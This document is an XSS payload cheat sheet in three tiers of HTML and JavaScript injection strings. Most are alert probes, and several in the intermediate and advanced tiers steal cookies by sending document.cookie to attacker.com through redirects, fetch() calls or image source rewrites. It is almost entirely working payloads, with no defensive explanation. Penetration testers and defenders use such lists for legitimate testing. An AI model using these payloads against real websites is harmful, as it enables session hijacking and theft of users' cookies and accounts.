XSS Payload Cheat Sheet

Beginner XSS Payloads

Basic alert 

<script>alert('XSS')</script>
Alert triggered by image loading error 

<img src="x" onerror="alert('XSS')">
SVG image onload event 

<svg onload="alert('XSS')"></svg>
Anchor tag with JavaScript link 

<a href="javascript:alert('XSS')">Click me</a>
Body onload event 

<body onload="alert('XSS')">
Input autofocus event 

<input type="text" autofocus onfocus="alert('XSS')">
Base64-encoded iframe payload 

<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"></iframe>
Input value with payload 

<input type="text" value="<img src=x onerror=alert('XSS')">

Intermediate XSS Payloads

Steal cookies 

<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
Load external content 

<iframe src="http://attacker.com/malicious.html"></iframe>
Alert triggered by image loading error 

<img src=x onerror=alert(document.cookie)>
Alert triggered by input focus event 

<input type="text" onfocus="alert(document.cookie)">
Alert triggered by inline JavaScript 

<img src="javascript:alert('XSS')">
Alert triggered by video source error 

<video><source onerror="alert('XSS')"></video>
Alert triggered by body onload event 

<body onload="alert(document.cookie)">
Alert triggered by image source error 

<img src=x: onerror=javascript:alert('XSS')>
Alert triggered by invalid image source 

<img src="x:x" onerror="alert('XSS')">
Log data to attacker's server 

<img src="x" onerror="document.location='http://attacker.com/log.php?data='+document.cookie">

Advanced XSS Payloads

Fetch and steal cookies 

<script>fetch('http://attacker.com/steal.php?cookie='+document.cookie)</script>
Alert triggered by video source error 

<video><source onerror="alert('XSS')"></video>
Marquee tag with alert 

<marquee onstart=alert('XSS')>XSS</marquee>
SVG onload event with alert 

<svg/onload=alert('XSS')>
Alert triggered by mouseover event 

<input type="text" value="" onmouseover="alert('XSS')">
Log data to attacker's server 

<script>document.location='http://attacker.com/log.php?data='+document.cookie</script>
Autofocus event with alert 

<input type="text" autofocus onfocus="alert(1)">
srcdoc attribute with alert 

<iframe srcdoc="<script>alert(1)</script>"></iframe>
Background with inline JavaScript 

<style>body{background:url('javascript:alert(1)')}</style>
Load attacker's content 

<img src=1 onerror=this.src='//attacker.com/pwned?c='+document.cookie>
Details tag with alert on toggle 

<details open ontoggle=alert(1)></details>
Template tag with alert on resize 

<template><content onresize=alert(1)></template>
Math tag with alert on mouseup 

<math><maction actiontype=toggle><mpadded><span onmouseup="alert(1)">X</span></mpadded></maction></math>
